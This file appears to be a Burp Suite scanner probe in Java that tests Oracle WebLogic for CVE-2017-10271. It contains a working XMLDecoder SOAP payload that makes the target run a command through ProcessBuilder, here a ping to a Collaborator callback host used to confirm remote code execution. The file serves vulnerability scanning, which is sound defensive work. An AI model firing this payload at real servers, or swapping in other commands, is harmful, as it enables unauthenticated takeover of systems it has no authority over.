package probes;

import burp.*;

import java.util.HashMap;

public class CVE_2017_10271 extends Probe {
    private static final String NAME = "CVE-2017-10271";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 7.5 (Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String path = "/wls-wsat/CoordinatorPortType";
        String pollPayload = Utilities.collaborator.generatePayload(true);
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                         "  <soapenv:Header>\n" +
                         "    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
                         "      <java>\n" +
                         "        <void class=\"java.lang.ProcessBuilder\">\n" +
                         "          <array class=\"java.lang.String\" length=\"2\">\n" +
                         "            <void index=\"0\">\n" +
                         "              <string>/usr/sbin/ping</string>\n" +
                         "            </void>\n" +
                         "            <void index=\"1\">\n" +
                         "              <string>" + pollPayload + "</string>\n" +
                         "            </void>\n" +
                         "          </array>\n" +
                         "          <void method=\"start\"/>\n" +
                         "        </void>\n" +
                         "      </java>\n" +
                         "    </work:WorkContext>\n" +
                         "  </soapenv:Header>\n" +
                         "  <soapenv:Body/>\n" +
                         "</soapenv:Envelope>";

        IHttpRequestResponse checkReqResp = postReq(
                requestResponse.getHttpService(),
                path,
                new HashMap<>() {
                    { put("Content-Type", "text/xml"); }
                },
                payload
        );

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    checkReqResp,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }
}
